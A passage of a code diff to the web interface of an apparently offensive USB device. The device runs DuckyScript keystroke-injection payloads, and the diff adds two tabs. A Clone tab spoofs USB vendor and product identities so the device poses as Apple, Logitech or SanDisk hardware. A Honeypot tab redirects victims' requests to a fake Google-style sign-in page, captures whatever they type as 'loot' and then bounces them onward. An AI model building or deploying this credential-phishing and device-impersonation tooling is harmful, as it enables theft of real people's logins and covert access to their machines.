@@ -41,6 +41,10 @@ VER_DIR    = ROOT / "verdicts"
 PAY_DIR    = ROOT / "payloads"       # scripts library
 EXT_DIR    = ROOT / "extensions"     # reusable DuckyScript includes
 LAY_DIR    = ROOT / "layouts"        # keyboard layouts
+ID_ENV     = ROOT / "identity.env"   # clone-identity override (sourced by S50)
+HONEY_DIR  = ROOT / "honeypot"       # honeypot assets + captured loot
+HONEY_HTML = HONEY_DIR / "index.html"
+HONEY_LOOT = HONEY_DIR / "loot.jsonl"
 LOG_PATH   = ROOT / "logs" / "ghostlink.log"
 STATS_PATH = Path("/tmp/ghostlink.stats.json")
 LEASE_PATH = Path("/tmp/dnsmasq.leases")
@@ -291,6 +295,10 @@ BUTTON_HOLD_PAYLOAD=
 BUTTON_TAP_WINDOW_MS=600
 BUTTON_HOLD_MS=1200
 NET_MODE=PASSIVE
+LIVESAVE=TRUE
+HONEYPOT=FALSE
+HONEYPOT_REDIRECT_AFTER=
+HONEYPOT_RULES=
 """
 
 
@@ -328,9 +336,10 @@ HTML = r"""<!doctype html>
     <button class="tablinks"        data-tab="Records">Records</button>
     <button class="tablinks"        data-tab="Query">Query</button>
     <button class="tablinks"        data-tab="Config">Config</button>
-    <button class="tablinks"        data-tab="HID">HID</button>
     <button class="tablinks"        data-tab="Scripting">Scripting</button>
     <button class="tablinks"        data-tab="LiveType">Live Type</button>
+    <button class="tablinks"        data-tab="Clone">Clone</button>
+    <button class="tablinks"        data-tab="Honeypot">Honeypot</button>
     <button class="tablinks"        data-tab="Terminal">Terminal</button>
     <button class="tablinks"        data-tab="System">System</button>
   </nav>
@@ -343,7 +352,9 @@ HTML = r"""<!doctype html>
     <div class="flex-row" style="justify-content: space-between; align-items: center;">
       <h3>Live Monitor</h3>
       <div class="flex-row" style="gap:10px;">
+        <button id="btnStream" onclick="toggleStream()" class="btn-ghost">&hellip;</button>
         <button id="btnRec" onclick="toggleRecord()" class="btn-ghost">&hellip;</button>
+        <button id="btnClear" onclick="clearRecordsLive()" class="btn-ghost" title="wipe records+verdicts without stopping recording">Clear records</button>
         <div id="recBadge" class="status-badge">REC OFF</div>
       </div>
     </div>
@@ -475,10 +486,14 @@ HTML = r"""<!doctype html>
       <div class="section">
         <h4>Core</h4>
         <div class="cfg-grid">
+          <div class="cfg-row sw-row"><label>Live-save switches</label>
+            <label class="sw"><input type="checkbox" data-k="LIVESAVE" checked><span class="slider"></span></label>
+            <span class="dim" style="font-size:11px;">auto-save a switch the moment you flip it</span>
+          </div>
           <div class="cfg-row"><label>Device name</label><input data-k="DEVICE_NAME"></div>
           <div class="cfg-row"><label>Hostname</label><input data-k="HOSTNAME"></div>
           <div class="cfg-row sw-row"><label>Enable HID</label>
-            <label class="sw"><input type="checkbox" data-k="ENABLE_HID"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="ENABLE_HID"><span class="slider"></span></label>
             <span class="dim" style="font-size:11px;">reboot after flip</span>
           </div>
           <div class="cfg-row"><label>WebUI port</label><input data-k="WEBUI_PORT" type="number" min="1" max="65535"></div>
@@ -492,13 +507,13 @@ HTML = r"""<!doctype html>
         <h4>Sniffer / Recording</h4>
         <div class="cfg-grid">
           <div class="cfg-row sw-row"><label>Logging on</label>
-            <label class="sw"><input type="checkbox" data-k="LOG"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="LOG"><span class="slider"></span></label>
           </div>
           <div class="cfg-row sw-row"><label>Record PCAP</label>
-            <label class="sw"><input type="checkbox" data-k="RECORD_PCAP"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="RECORD_PCAP"><span class="slider"></span></label>
           </div>
           <div class="cfg-row sw-row"><label>Verdict stream</label>
-            <label class="sw"><input type="checkbox" data-k="VERDICT_STREAM"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="VERDICT_STREAM"><span class="slider"></span></label>
           </div>
           <div class="cfg-row"><label>Sniff iface</label><input data-k="SNIFF_IFACE" placeholder="usb0 / eth0"></div>
           <div class="cfg-row"><label>Rotate (KB)</label><input data-k="RECORD_ROTATE_KB" type="number"></div>
@@ -513,7 +528,7 @@ HTML = r"""<!doctype html>
         <h4>Button</h4>
         <div class="cfg-grid">
           <div class="cfg-row sw-row"><label>Button enabled</label>
-            <label class="sw"><input type="checkbox" data-k="BUTTON_ENABLED"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="BUTTON_ENABLED"><span class="slider"></span></label>
           </div>
           <div class="cfg-row"><label>Button device</label><input data-k="BUTTON_DEV" placeholder="/dev/input/event0"></div>
           <div class="cfg-row"><label>Single-tap payload</label><input data-k="BUTTON_PAYLOAD" placeholder="hello.ducky"></div>
@@ -528,7 +543,7 @@ HTML = r"""<!doctype html>
         <h4>DHCP / DNS</h4>
         <div class="cfg-grid">
           <div class="cfg-row sw-row"><label>dnsmasq on</label>
-            <label class="sw"><input type="checkbox" data-k="DNSMASQ"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="DNSMASQ"><span class="slider"></span></label>
           </div>
           <div class="cfg-row"><label>DHCP range</label><input data-k="DHCP_RANGE"></div>
           <div class="cfg-row"><label>DNS upstream</label><input data-k="DNS_UPSTREAM"></div>
@@ -540,15 +555,15 @@ HTML = r"""<!doctype html>
         <h4>Redirect</h4>
         <div class="cfg-grid">
           <div class="cfg-row sw-row"><label>Redirect on</label>
-            <label class="sw"><input type="checkbox" data-k="REDIRECT"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="REDIRECT"><span class="slider"></span></label>
           </div>
           <div class="cfg-row sw-row"><label>Preserve path</label>
-            <label class="sw"><input type="checkbox" data-k="REDIRECT_PRESERVE_PATH"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="REDIRECT_PRESERVE_PATH"><span class="slider"></span></label>
           </div>
           <div class="cfg-row"><label>REDIRECT_FROM (csv)</label><input data-k="REDIRECT_FROM"></div>
           <div class="cfg-row"><label>REDIRECT_TO (URL/host)</label><input data-k="REDIRECT_TO"></div>
           <div class="cfg-row sw-row"><label>DNS spoof file on</label>
-            <label class="sw"><input type="checkbox" data-k="DNS_SPOOF"><span></span></label>
+            <label class="sw"><input type="checkbox" data-k="DNS_SPOOF"><span class="slider"></span></label>
           </div>
           <div class="cfg-row"><label>DNS spoof file path</label><input data-k="DNS_SPOOF_HOSTS"></div>
         </div>
@@ -572,24 +587,7 @@ HTML = r"""<!doctype html>
     </div>
   </section>
 
-  <!-- =========== HID =========== -->
-  <section id="tab-HID" class="tabcontent">
-    <h3>HID / BadUSB</h3>
-    <div class="section">
-      <p class="dim" style="font-size:13px;">
-        Requires <code>ENABLE_HID=TRUE</code> + reboot so <code>/dev/hidg0</code>
-        gets wired into the gadget. Without it, fire returns 500.
-      </p>
-      <div class="setting-row flex-row" style="gap:10px;">
-        <input type="text" id="pl" placeholder="/root/ghostlink/payloads/hello.ducky" class="flex-grow">
-        <button onclick="runHid()">Fire</button>
-      </div>
-    </div>
-    <div class="section">
-      <h4>Available Payloads</h4>
-      <ul id="payloads" class="file-list"><li class="dim">&hellip;</li></ul>
-    </div>
-  </section>
+  <!-- (HID tab removed — use Scripting pane instead for payload fire) -->
 
   <!-- =========== SCRIPTING (DuckyScript IDE) =========== -->
   <section id="tab-Scripting" class="tabcontent">
@@ -599,34 +597,27 @@ HTML = r"""<!doctype html>
     </div>
 
     <div class="ide-grid">
-      <!-- LEFT: library + layout picker -->
+      <!-- LEFT: compact sidebar — layout picker, scripts, extensions -->
       <aside class="ide-side">
-        <div class="section" style="margin:0;">
+        <div class="section">
+          <h4>Layout</h4>
+          <select id="layoutSel" onchange="setLayout(this.value)" style="width:100%; font-size:12px;"></select>
+        </div>
+        <div class="section">
           <h4>Scripts <span class="dim" id="scriptCount"></span></h4>
-          <div class="setting-row flex-row" style="gap:6px; margin-bottom:8px;">
-            <input type="text" id="newScriptName" placeholder="new_name.ducky" style="min-width:0;" class="flex-grow">
-            <button onclick="scriptsNew()">+ New</button>
+          <div class="setting-row flex-row" style="gap:4px; margin-bottom:6px;">
+            <input type="text" id="newScriptName" placeholder="name.ducky" style="min-width:0; font-size:12px;" class="flex-grow">
+            <button onclick="scriptsNew()" style="padding:6px 10px;">+</button>
           </div>
           <ul id="scriptList" class="file-list"><li class="dim">&hellip;</li></ul>
         </div>
-        <div class="section" style="margin:12px 0 0;">
+        <div class="section">
           <h4>Extensions <span class="dim" id="extCount"></span></h4>
-          <div class="setting-row flex-row" style="gap:6px; margin-bottom:8px;">
-            <input type="text" id="newExtName" placeholder="new_ext_name" style="min-width:0;" class="flex-grow">
-            <button onclick="extsNew()">+ New</button>
+          <div class="setting-row flex-row" style="gap:4px; margin-bottom:6px;">
+            <input type="text" id="newExtName" placeholder="name" style="min-width:0; font-size:12px;" class="flex-grow">
+            <button onclick="extsNew()" style="padding:6px 10px;">+</button>
           </div>
           <ul id="extList" class="file-list"><li class="dim">&hellip;</li></ul>
-          <p class="dim" style="font-size:12px;margin-top:6px;">
-            Reference from a script with <code>EXTENSION name</code>.
-            Nested EXTENSIONs resolve recursively (depth cap 16).
-          </p>
-        </div>
-        <div class="section" style="margin:12px 0 0;">
-          <h4>Keyboard layout</h4>
-          <select id="layoutSel" onchange="setLayout(this.value)" style="width:100%;"></select>
-          <p class="dim" style="font-size:12px;margin-top:6px;">
-            Affects STRING char lookup when payloads run. Set live, no reboot.
-          </p>
         </div>
       </aside>
 
@@ -666,10 +657,13 @@ HTML = r"""<!doctype html>
         target host sees it as a wireless keyboard.
       </p>
       <div class="flex-row" style="justify-content:space-between; align-items:center;">
-        <label class="sw">
-          <input type="checkbox" id="liveEn" checked>
+        <span class="sw-inline">
+          <label class="sw">
+            <input type="checkbox" id="liveEn" checked>
+            <span class="slider"></span>
+          </label>
           <span>Live typing enabled</span>
-        </label>
+        </span>
         <span id="liveStatus" class="dim" style="font-size:12px;">armed</span>
       </div>
       <textarea id="liveInput" spellcheck="false"
@@ -687,6 +681,173 @@ HTML = r"""<!doctype html>
         <button onclick="liveSendCombo('CTRL','ALT','DELETE')" class="btn-ghost">Ctrl+Alt+Del</button>
         <span class="spacer"></span>
         <button onclick="document.getElementById('liveInput').value=''" class="btn-ghost">Clear local text</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========== CLONE (USB identity override) =========== -->
+  <section id="tab-Clone" class="tabcontent">
+    <h3>Clone USB identity</h3>
+    <div class="section">
+      <p class="dim" style="font-size:13px;">
+        Override the gadget's VID/PID + descriptor strings so the device
+        enumerates to the host as something else — a specific brand of
+        USB-Ethernet adapter, a known keyboard, whatever. Changes take
+        effect on <b>next reboot</b> (live rebind is the brick path on this
+        kernel — see <code>docs/HID.md</code>). Clear fields and save to
+        remove the override and go back to the stock Rockchip identity.
+      </p>
+      <div class="cfg-grid">
+        <div class="cfg-row"><label>Vendor ID (hex)</label><input id="idVid" placeholder="0x2207"></div>
+        <div class="cfg-row"><label>Product ID (hex)</label><input id="idPid" placeholder="0x0019"></div>
+        <div class="cfg-row"><label>Manufacturer</label><input id="idMfr" placeholder="Rockchip"></div>
+        <div class="cfg-row"><label>Product name</label><input id="idProd" placeholder="rk3xxx"></div>
+        <div class="cfg-row"><label>Serial</label><input id="idSer" placeholder="(leave blank = auto)"></div>
+      </div>
+      <div class="flex-row" style="gap:10px; margin-top:12px;">
+        <button onclick="idSave()" class="btn-save">Save (takes effect on reboot)</button>
+        <button onclick="idClear()" class="btn-ghost">Clear override</button>
+        <button onclick="idReboot()" class="danger">Save &amp; reboot now</button>
+      </div>
+      <div id="idStatus" class="dim" style="margin-top:10px;font-size:12px;">loading&hellip;</div>
+    </div>
+    <div class="section">
+      <h4>Known-good identities</h4>
+      <p class="dim" style="font-size:12px;">One click fills the form. Save or Reboot to apply.</p>
+      <div class="flex-row" style="gap:6px; flex-wrap:wrap;">
+        <button class="btn-ghost" onclick="idPreset('0x2207','0x0019','Rockchip','rk3xxx','')">Stock Rockchip</button>
+        <button class="btn-ghost" onclick="idPreset('0x05ac','0x024f','Apple Inc.','Magic Keyboard','')">Apple Keyboard</button>
+        <button class="btn-ghost" onclick="idPreset('0x046d','0xc31c','Logitech','USB Keyboard','')">Logitech Keyboard</button>
+        <button class="btn-ghost" onclick="idPreset('0x0bda','0x8153','Realtek','USB 3.0 LAN','')">Realtek USB-Ethernet</button>
+        <button class="btn-ghost" onclick="idPreset('0x0781','0x5591','SanDisk','Cruzer Glide','')">SanDisk USB drive</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <h4>Connected hosts <span class="dim" style="font-size:12px;">(from DHCP leases)</span></h4>
+      <p class="dim" style="font-size:12px;">
+        Any PC that got an IP from the WebBee's dnsmasq shows up here.
+        Clicking <b>Clone</b> on a row picks a credible USB identity
+        matching that host's vendor (Apple/Microsoft/Lenovo/…), writes it
+        to <code>identity.env</code>, and takes effect on next boot. Plug
+        the device into a different PC afterwards and it enumerates as
+        the cloned brand.
+      </p>
+      <div class="table-wrap">
+        <table class="t-verdicts">
+          <thead><tr>
+            <th>hostname</th><th>ip</th><th>mac</th>
+            <th>vendor</th><th>os guess</th><th>&nbsp;</th>
+          </tr></thead>
+          <tbody id="hostsBody"><tr><td colspan="6" class="dim">loading&hellip;</td></tr></tbody>
+        </table>
+      </div>
+      <div class="flex-row" style="gap:8px; margin-top:8px;">
+        <button class="btn-ghost" onclick="hostsRefresh()">Refresh</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <h4>Network state</h4>
+      <div class="stat-grid">
+        <div class="stat"><label>Internet</label>    <div class="val" id="netInternet">?</div></div>
+        <div class="stat"><label>via</label>         <div class="val" id="netVia">-</div></div>
+        <div class="stat"><label>latency</label>     <div class="val" id="netLatency">-</div></div>
+        <div class="stat"><label>eth0 / usb0</label> <div class="val" id="netLinks">-</div></div>
+      </div>
+      <div class="flex-row" style="gap:8px; margin-top:8px;">
+        <button class="btn-ghost" onclick="netProbe()">Check now</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========== HONEYPOT =========== -->
+  <section id="tab-Honeypot" class="tabcontent">
+    <h3>Honeypot <span class="dim" style="font-size:12px;">(fake sign-in + loot capture)</span></h3>
+
+    <div class="section">
+      <h4>Status</h4>
+      <div class="flex-row" style="justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+        <div style="flex:1 1 260px;">
+          <div class="dim" style="font-size:12px;">
+            When a victim's browser requests any host in <code>REDIRECT_FROM</code>
+            (or any host from a <code>WEBSITE_VISIT=</code> rule), the device
+            serves the honeypot page instead of 302-ing. Everything they type
+            into the form gets captured, logged red in Live, and the victim
+            is redirected to <code>HONEYPOT_REDIRECT_AFTER</code> (or a
+            <code>SIGN_IN REDIRECT_TO</code> rule, if set).
+          </div>
+        </div>
+        <div class="flex-row" style="gap:10px; align-items:center;">
+          <span>Enable</span>
+          <label class="sw">
+            <input type="checkbox" id="hpEnable" data-k="HONEYPOT">
+            <span class="slider"></span>
+          </label>
+          <span id="hpState" class="status-badge">OFF</span>
+        </div>
+      </div>
+      <div class="stat-grid" style="margin-top:10px;">
+        <div class="stat"><label>loot captured</label>  <div class="val match" id="hpLoot">0</div></div>
+        <div class="stat"><label>custom html</label>    <div class="val"       id="hpCustom">no</div></div>
+        <div class="stat"><label>rules</label>          <div class="val"       id="hpRules">0</div></div>
+        <div class="stat"><label>trap hosts</label>     <div class="val"       id="hpHosts">0</div></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h4>Behavior</h4>
+      <div class="cfg-row">
+        <label>Redirect after sign-in</label>
+        <input id="hpAfter" type="text" placeholder="https://google.com (or empty = bounce victim back to original host)">
+      </div>
+      <div class="cfg-row">
+        <label>Rules (DSL — one per line)</label>
+        <textarea id="hpRulesTxt" rows="4" spellcheck="false"
+                  placeholder="ON SIGN_IN REDIRECT_TO https://google.com&#10;ON WEBSITE_VISIT=google.com REDIRECT_HONEYPOT"></textarea>
+      </div>
+      <div class="dim" style="font-size:11px; margin:4px 0 10px;">
+        Supported rules — rough grammar, forgiving about spaces/equals/commas:<br>
+        &nbsp;&nbsp;<code>ON SIGN_IN REDIRECT_TO &lt;url&gt;</code>
+        &nbsp;&middot;&nbsp;
+        <code>ON WEBSITE_VISIT=&lt;host&gt; REDIRECT_HONEYPOT</code>
+      </div>
+      <div class="flex-row" style="gap:8px;">
+        <button class="btn-primary" onclick="hpSaveBehavior()">Save behavior</button>
+        <button class="btn-ghost"   onclick="hpReload()">Reload</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <h4>Custom index.html</h4>
+      <div class="dim" style="font-size:12px; margin-bottom:8px;">
+        Upload your own full HTML page. Any <code>&lt;form&gt;</code> on the page
+        is auto-wired: every field submits to <code>/_honeypot_submit</code>
+        — no need to edit the page's markup. Leave empty to use the bundled
+        Google-style default.
+      </div>
+      <textarea id="hpHtml" rows="12" spellcheck="false"
+                style="font-family: ui-monospace, Menlo, monospace; font-size:12px;"></textarea>
+      <div class="flex-row" style="gap:8px; margin-top:8px;">
+        <button class="btn-primary"  onclick="hpSaveHtml()">Save HTML</button>
+        <button class="btn-ghost"    onclick="hpResetHtml()">Reset to bundled</button>
+        <button class="btn-ghost"    onclick="hpPreview()">Preview</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="flex-row" style="justify-content:space-between; align-items:center;">
+        <h4>Captured loot</h4>
+        <div class="flex-row" style="gap:8px;">
+          <button class="btn-ghost" onclick="hpReloadLoot()">Refresh</button>
+          <button class="btn-ghost" onclick="hpClearLoot()">Clear</button>
+        </div>
+      </div>
+      <div class="table-wrap">
+        <table class="t-verdicts">
+          <thead><tr><th>time</th><th>ip</th><th>host</th><th>fields</th><th>ua</th></tr></thead>
+          <tbody id="hpLootBody"><tr><td colspan="5" class="dim">no captures yet</td></tr></tbody>
+        </table>
       </div>
     </div>
   </section>
@@ -1104,12 +1265,36 @@ td.actions a { font-size: 12px; }
 /* ---- IDE (Scripting pane) ---------------------------------------------- */
 .ide-grid {
   display: grid;
-  grid-template-columns: 260px 1fr;
+  grid-template-columns: minmax(220px, 280px) 1fr;
   gap: 14px;
-  margin: 20px 0;
+  margin: 16px 0 0;
+  align-items: start;
 }
-.ide-side { min-width: 0; }
-.ide-main { min-width: 0; display: flex; flex-direction: column; gap: 10px; }
+.ide-side {
+  min-width: 0;
+  max-height: calc(100vh - 240px);
+  overflow-y: auto;
+  padding-right: 4px;
+}
+.ide-side .section {
+  margin: 0 0 10px !important;
+  padding: 12px 14px !important;
+}
+.ide-side .section h4 { margin: 0 0 8px; font-size: 13px; }
+.ide-side ul.file-list { max-height: 240px; overflow-y: auto; }
+.ide-side ul.file-list li {
+  padding: 6px 10px;
+  margin-bottom: 4px;
+  font-size: 12px;
+}
+.ide-main {
+  min-width: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+.editor-wrapper { min-height: calc(100vh - 320px); }
+.editor-wrapper textarea { min-height: calc(100vh - 320px); }
 
 .editor-toolbar {
   gap: 8px;
@@ -1233,9 +1418,48 @@ ul.file-list li .fl-del {
 }
 ul.file-list li:hover .fl-del { opacity: 1; }
 
-/* ---- Live Type pane ---------------------------------------------------- */
-label.sw { display: inline-flex; align-items: center; gap: 10px; cursor: pointer; user-select: none; }
-label.sw input { accent-color: var(--primary); width: 16px; height: 16px; }
+/* ---- real toggle switches (ESP-S3-DevKitC-BadUSB style) --------------- */
+/* Every form boolean renders as .sw > input + .slider so the UI is a
+   row of actual toggle switches instead of raw browser checkboxes. */
+label.sw {
+  position: relative;
+  display: inline-block;
+  width: 46px;
+  height: 24px;
+  vertical-align: middle;
+  cursor: pointer;
+  user-select: none;
+}
+label.sw input { opacity: 0; width: 0; height: 0; }
+label.sw .slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background-color: #444;
+  transition: .25s;
+  border-radius: 34px;
+}
+label.sw .slider:before {
+  position: absolute;
+  content: "";
+  height: 18px; width: 18px;
+  left: 3px; bottom: 3px;
+  background-color: white;
+  transition: .25s;
+  border-radius: 50%;
+}
+label.sw input:checked + .slider { background-color: var(--primary); }
+label.sw input:checked + .slider:before { transform: translateX(22px); }
+
+/* a .sw-inline wrapper lets us put label + switch on one row (used in Live
+   pane and the inline Live-Typing toggle where we want the text left and
+   the switch right). */
+.sw-inline {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+}
+.sw-inline > label.sw { flex: 0 0 46px; }
 
 /* ---- Config form grid -------------------------------------------------- */
 .cfg-grid {
@@ -1325,12 +1549,13 @@ function openTab(name) {
   location.hash = name;
   if (name === 'Records')   refreshRecords();
   if (name === 'System')    refreshSystem();
-  if (name === 'HID')       refreshPayloads();
   // Config tab: always refetch so changes made via other tabs
   // (quick-spoof, DuckyScript GL_SET, external edits) are visible
   if (name === 'Config')    { loadCfg(); }
   if (name === 'Scripting') { scriptsRefresh(); extsRefresh(); layoutsRefresh(); }
   if (name === 'LiveType')  { $('#liveInput').focus(); }
+  if (name === 'Clone')     { idRefresh(); hostsRefresh(); netProbe(); }
+  if (name === 'Honeypot')  { hpReload(); hpReloadLoot(); }
   if (name === 'Terminal')  { cliProbe(); setTimeout(() => $('#termIn') && $('#termIn').focus(), 50); }
 }
 
@@ -1347,6 +1572,8 @@ async function tick() {
       b.classList.remove('on'); b.textContent = 'REC OFF';
       if (btn) btn.textContent = 'Start recording';
     }
+    const btnS = $('#btnStream');
+    if (btnS) btnS.textContent = st.verdict ? 'Stop streaming' : 'Start streaming';
     $('#s-pps').textContent     = live.pps ?? 0;
     $('#s-mps').textContent     = live.mps ?? 0;
     $('#s-frames').textContent  = (live.frames ?? 0).toLocaleString();
@@ -1498,8 +1725,36 @@ async function cfgReload() {
   const d = cfgParse(CFG_RAW);
   $$('[data-k]').forEach(el => {
     const k = el.dataset.k;
-    if (el.type === 'checkbox') el.checked = cfgTruthy(d[k]);
-    else                         el.value = d[k] != null ? d[k] : '';
+    if (el.type === 'checkbox') {
+      // LIVESAVE defaults to ON when unset
+      el.checked = (k === 'LIVESAVE' && d[k] == null) ? true : cfgTruthy(d[k]);
+    } else {
+      el.value = d[k] != null ? d[k] : '';
+    }
+  });
+}
+
+/* --- live-save: when a switch flips, save immediately. The LIVESAVE
+   switch itself gates this feature. */
+function bindLiveSave() {
+  document.addEventListener('change', e => {
+    const el = e.target;
+    if (!el || !el.dataset || !el.dataset.k) return;
+    if (el.type !== 'checkbox') return;              // only switches live-save
+    const live = $('[data-k="LIVESAVE"]');
+    if (live && !live.checked && el.dataset.k !== 'LIVESAVE') return;
+    // Save without doing a full form re-collect — just overlay this one key
+    // (keeps mid-edit text inputs intact).
+    const re = new RegExp('^' + el.dataset.k + '=.*$', 'm');
+    let txt = CFG_RAW || '';
+    const line = el.dataset.k + '=' + (el.checked ? 'TRUE' : 'FALSE');
+    txt = re.test(txt) ? txt.replace(re, line)
+                       : (txt + (txt.endsWith('\n') ? '' : '\n') + line + '\n');
+    CFG_RAW = txt; $('#cfg').value = txt;
+    api('/api/config', { method:'POST', body: txt }).then(r => {
+      if (r && r.ok) toast(`${el.dataset.k}=${el.checked ? 'TRUE' : 'FALSE'}`);
+      else           toast('live-save failed', true);
+    });
   });
 }
 function cfgCollect() {
@@ -1598,6 +1853,233 @@ async function reboot() {
   await api('/api/reboot', { method:'POST' });
 }
 
+/* --- clone identity -------------------------------------------------- */
+async function idRefresh() {
+  const r = await api('/api/clone/identity');
+  if (typeof r === 'object' && r.identity) {
+    const d = r.identity;
+    $('#idVid').value  = d.VID  || '';
+    $('#idPid').value  = d.PID  || '';
+    $('#idMfr').value  = d.MFR  || '';
+    $('#idProd').value = d.PROD || '';
+    $('#idSer').value  = d.SER  || '';
+  } else {
+    ['#idVid','#idPid','#idMfr','#idProd','#idSer'].forEach(s => $(s).value = '');
+  }
+  const st = $('#idStatus');
+  st.textContent = r.active
+    ? `override active: VID=${r.identity.VID||'-'}, PID=${r.identity.PID||'-'}`
+    : 'no override active — stock identity in use';
+  st.style.color = r.active ? 'var(--primary)' : 'var(--text-muted)';
+}
+async function idSave(then_reboot) {
+  const body = {
+    VID:  $('#idVid').value.trim(),
+    PID:  $('#idPid').value.trim(),
+    MFR:  $('#idMfr').value.trim(),
+    PROD: $('#idProd').value.trim(),
+    SER:  $('#idSer').value.trim(),
+  };
+  const r = await api('/api/clone/identity', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(body),
+  });
+  if (r.ok) { toast('saved — takes effect on reboot'); idRefresh(); }
+  else      { toast('save failed: ' + (r.err||''), true); }
+  return !!r.ok;
+}
+async function idClear() {
+  if (!confirm('remove identity override? (stock identity restored on next boot)')) return;
+  const r = await api('/api/clone/identity', { method: 'DELETE' });
+  if (r.ok) { toast('override cleared'); idRefresh(); }
+  else      { toast('clear failed', true); }
+}
+async function idReboot() {
+  if (!confirm('save + reboot now?')) return;
+  if (!await idSave(true)) return;
+  await api('/api/reboot', { method:'POST' });
+}
+function idPreset(v,p,m,prod,ser) {
+  $('#idVid').value = v; $('#idPid').value = p;
+  $('#idMfr').value = m; $('#idProd').value = prod; $('#idSer').value = ser;
+}
+
+async function hostsRefresh() {
+  let hosts;
+  try { hosts = await api('/api/clone/hosts'); } catch(e) { return; }
+  const body = $('#hostsBody'); if (!body) return;
+  if (!hosts || !hosts.length) {
+    body.innerHTML = '<tr><td colspan="6" class="dim">no DHCP leases yet — plug in a host via USB</td></tr>';
+    return;
+  }
+  body.innerHTML = hosts.map(h => {
+    const os = h.os || {};
+    const osLabel = os.guess === 'unknown' ? '-' : os.guess;
+    const osTitle = (os.hints || []).join(' + ');
+    const vMac = esc(h.mac || '');
+    const vHn  = esc(h.hostname || '');
+    return `<tr${h.active ? '' : ' class="dim"'}>
+      <td>${esc(h.hostname || '(unknown)')}</td>
+      <td>${esc(h.ip)}</td>
+      <td><code>${vMac}</code></td>
+      <td>${esc(h.vendor || '-')}</td>
+      <td title="${esc(osTitle)}">${esc(osLabel)}</td>
+      <td><button class="btn-ghost" onclick="cloneHost('${vMac}','${vHn}')">Clone</button></td>
+    </tr>`;
+  }).join('');
+}
+
+async function cloneHost(mac, hostname) {
+  if (!confirm(`Clone identity from ${hostname || mac}?\nTakes effect on next reboot.`)) return;
+  try {
+    const r = await api('/api/clone/host_apply', {
+      method: 'POST',
+      body: JSON.stringify({mac, hostname}),
+    });
+    if (!r || !r.ok) { alert('clone failed: ' + ((r && r.err) || '?')); return; }
+    const id = r.identity || {};
+    toast(`Cloned: ${id.MFR} / ${id.PROD} (${id.VID}/${id.PID})`);
+    idRefresh();
+  } catch(e) { alert('clone failed: ' + e); }
+}
+
+async function netProbe() {
+  const put = (id, val) => { const el = $('#'+id); if (el) el.textContent = val; };
+  put('netInternet', '…'); put('netVia', '-'); put('netLatency', '-');
+  let d; try { d = await api('/api/net/internet'); } catch(e) { d = {}; }
+  put('netInternet', d.ok ? 'ONLINE' : 'offline');
+  put('netVia',      d.via || '-');
+  put('netLatency',  d.latency_ms != null ? d.latency_ms + ' ms' : '-');
+  // compact link summary from refreshNetLink's data
+  try {
+    const link = await api('/api/net/link');
+    const eth = (link.eth0 && link.eth0.carrier) ? 'eth0 UP' : 'eth0 down';
+    const usb = (link.usb0 && link.usb0.carrier) ? 'usb0 UP' : 'usb0 down';
+    put('netLinks', eth + ' · ' + usb);
+  } catch(e) { put('netLinks', '-'); }
+}
+
+/* --- Honeypot ------------------------------------------------- */
+async function hpReload() {
+  let s;
+  try { s = await api('/api/honeypot/status'); } catch(e) { return; }
+  const en = $('#hpEnable');  if (en)   en.checked = !!s.enabled;
+  const st = $('#hpState');   if (st) { st.textContent = s.enabled ? 'ON' : 'OFF';
+                                        st.classList.toggle('on', !!s.enabled); }
+  const a  = $('#hpAfter');   if (a)    a.value  = s.redirect_after || '';
+  const r  = $('#hpRulesTxt');if (r)    r.value  = s.rules_text || '';
+  $('#hpLoot')   && ($('#hpLoot').textContent   = s.loot_count || 0);
+  $('#hpCustom') && ($('#hpCustom').textContent = s.custom_html ? 'yes' : 'no');
+  $('#hpRules')  && ($('#hpRules').textContent  = (s.rules_parsed || []).length);
+  // trap-host count: unique redirect_from + WEBSITE_VISIT rules
+  const trapHosts = new Set();
+  (s.redirect_from || '').split(',').forEach(h => { h=h.trim(); if (h) trapHosts.add(h); });
+  (s.rules_parsed || []).forEach(x => { if (x.host) trapHosts.add(x.host); });
+  $('#hpHosts') && ($('#hpHosts').textContent = trapHosts.size);
+  // Lazy-load the uploaded HTML into the textarea only on first open
+  const h = $('#hpHtml');
+  if (h && !h.dataset.loaded) {
+    try {
+      const r2 = await fetch('/api/honeypot/index', {credentials:'same-origin'});
+      h.value = await r2.text(); h.dataset.loaded = '1';
+    } catch(e) {}
+  }
+}
+
+async function hpReloadLoot() {
+  let data;
+  try { data = await api('/api/honeypot/loot'); } catch(e) { return; }
+  const body = $('#hpLootBody'); if (!body) return;
+  if (!data || !data.length) {
+    body.innerHTML = '<tr><td colspan="5" class="dim">no captures yet</td></tr>';
+    return;
+  }
+  body.innerHTML = data.slice(0, 200).map(r => {
+    const fields = Object.entries(r.data || {})
+      .map(([k,v]) => `<code>${esc(k)}=${esc(String(v).slice(0,40))}</code>`)
+      .join(' ');
+    return `<tr class="match-row">
+      <td>${esc(r.ts || '')}</td>
+      <td>${esc(r.ip || '')}</td>
+      <td>${esc(r.host || '')}</td>
+      <td>${fields}</td>
+      <td class="dim">${esc((r.ua || '').slice(0,60))}</td>
+    </tr>`;
+  }).join('');
+}
+
+async function hpSaveHtml() {
+  const h = $('#hpHtml'); if (!h) return;
+  try {
+    const r = await fetch('/api/honeypot/index', {
+      method:'POST', credentials:'same-origin',
+      headers:{'Content-Type':'text/html'},
+      body: h.value });
+    const j = await r.json();
